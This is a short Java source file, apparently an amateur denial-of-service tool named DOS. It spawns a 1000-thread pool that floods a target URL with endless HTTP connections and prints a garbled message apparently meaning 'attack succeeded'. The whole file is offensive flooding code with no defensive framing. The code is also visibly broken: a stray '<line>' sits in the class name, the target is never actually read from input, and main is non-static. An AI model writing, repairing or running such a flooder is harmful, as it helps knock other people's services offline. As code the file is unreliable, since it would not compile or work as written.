
//author : n00B

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DOS<line> {
    BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
    String Target_Host=in.toString();
    private int num=0;
    public void main(String args[]){
        ExecutorService es= Executors.newFixedThreadPool(1000);
        Pang pang=new Pang();
        Thread thread=new Thread(pang);
        for(int i=0;i<10000;i++){
            es.execute(thread);
        }
    }

    class Pang implements Runnable{

        @Override
        public void run() {
            while(true){
                try{
                    URL url=new URL(Target_Host);
                    URLConnection conn=url.openConnection();
                    System.out.println("-------------"+Target_Host+"-----------");
                    BufferedInputStream bis=new BufferedInputStream(conn.getInputStream());
                    byte[] bytes=new byte[1024];
                    int len=-1;
                    StringBuffer sb=new StringBuffer();
                    if(bis!=null){
                        if((len=bis.read())!=-1){
                            sb.append(new String(bytes,0,len));
                            System.out.println("¹¥»÷³É¹¦£¡£¡£¡");
                            bis.close();
                        }
                    }
                    }catch(Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
